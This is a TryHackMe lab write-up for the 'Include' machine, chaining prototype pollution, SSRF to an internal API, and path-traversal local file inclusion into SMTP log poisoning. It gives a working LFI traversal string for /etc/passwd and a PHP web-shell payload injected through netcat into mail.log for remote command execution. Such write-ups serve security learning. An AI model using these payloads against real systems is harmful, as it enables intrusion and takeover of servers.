# Include — Security Lab Writeup

## Overview

* Target: Include
* Platform: TryHackMe
* Difficulty: Easy/Medium??
* OS: Linux
* Techniques: Prototype Pollution, SSRF, LFI, Log Poisoning

---

# Reconnaissance

## Nmap Scan

Initial scan:

```bash
nmap -sV -A -T5 <IP>
```

Important results:

```
22/tcp     open  ssh      OpenSSH 8.2p1 Ubuntu
25/tcp     open  smtp     Postfix smtpd
110/tcp    open  pop3     Dovecot pop3d
143/tcp    open  imap     Dovecot imapd
993/tcp    open  ssl/imap
995/tcp    open  ssl/pop3
4000/tcp   open  http     Node.js (Express)
50000/tcp  open  http     Apache 2.4.41
```

Interesting services identified:

* **Node.js application on port 4000**
* **Apache web application on port 50000**
* **SMTP server (Postfix)**

---

# Web Enumeration

## Directory Discovery

Using Gobuster:

```bash
gobuster dir -u http://<IP>:4000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Discovered endpoints:

```
/signin
/signup
/images
/fonts
```

The application redirected users to `/signin`.

---

# Initial Access

The login page provided default credentials:

```
guest : guest
```

After logging in, a **profile section** allowed modification of user profile fields.

Testing this functionality revealed a **JavaScript Prototype Pollution vulnerability**.

By manipulating the object structure, it was possible to escalate privileges and grant the **guest account admin privileges**.
<img width="1037" height="718" alt="Skärmbild 2026-02-08 134122" src="https://github.com/user-attachments/assets/59a46060-8740-47f8-b979-e5cce730867f" />


---

# Admin Access

After gaining admin privileges, additional sections became accessible:

* **Internal API dashboard**
* **Profile banner update functionality**

The banner update endpoint accepted external URLs.

Testing this endpoint revealed a **Server-Side Request Forgery (SSRF)** vulnerability.
<img width="1083" height="629" alt="Skärmbild 2026-02-08 134204" src="https://github.com/user-attachments/assets/e6645086-f48d-4b6c-874a-9ca2ff01bb43" />
<img width="1077" height="542" alt="Skärmbild 2026-02-08 134238" src="https://github.com/user-attachments/assets/382a7b81-b579-4db0-83a7-932a1c974c77" />


---

# SSRF Exploitation

Using SSRF, internal requests could be made to the application's internal API.

Example internal API:

```
http://127.0.0.1:5000/internal-api
```

This returned sensitive information including API credentials.

Decoded response revealed credentials for the **SysMon monitoring application**.
<img width="981" height="553" alt="Skärmbild 2026-02-08 134305" src="https://github.com/user-attachments/assets/a251a7c2-85b7-407e-82fc-97d45b8b1ebe" />

---

# SysMon Access

Using the recovered credentials allowed login to the **SysMon monitoring dashboard**.

The first flag was located here.

```
{First flag}
```

Further investigation revealed a user profile endpoint:

```
http://<IP>:50000/profile.php?img=profile.png
```

---

# Local File Inclusion

Testing the `img` parameter revealed an **LFI vulnerability**.

Working payload example:

```
/profile.php?img=....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd
```

This allowed reading arbitrary files on the system.

---

# Log File Enumeration

Important files discovered:

```
/var/log/mail.log
/var/log/syslog
/var/log/apache2/access.log
```

Since the machine exposed **SMTP on port 25**, it was possible to poison the mail logs.

---

# Log Poisoning

A connection to the SMTP service was established:

```
nc <IP> 25
```

Payload injected:

```
MAIL FROM:text@<?php system($_GET['cmd']); ?>
```

This PHP payload was written to **mail.log**.

Using the LFI vulnerability to include the log file executed the injected PHP code.

This resulted in **remote command execution**.


---

# Post Exploitation

Using command execution, the web directory was enumerated:

```
/var/www/html
```

The final flag was located in the web directory.
<img width="440" height="235" alt="Skärmbild 2026-02-08 150556" src="https://github.com/user-attachments/assets/c9a35b55-5b0b-4baa-b1d6-d2ef19b35e2f" />
---

# Vulnerabilities Identified

* JavaScript Prototype Pollution
* Server-Side Request Forgery (SSRF)
* Local File Inclusion (LFI)
* Log Poisoning via SMTP logs

---

# Lessons Learned

* Prototype pollution can lead to **privilege escalation in JavaScript applications**.
* SSRF vulnerabilities can expose **internal APIs and credentials**.
* LFI vulnerabilities can be chained with **log poisoning for RCE**.
* Useful log files for poisoning include:

  * mail.log
  * Apache access logs
  * syslog

---

# Tools Used

* Nmap
* Gobuster
* netcat
* Burp Suite
* dirsearch
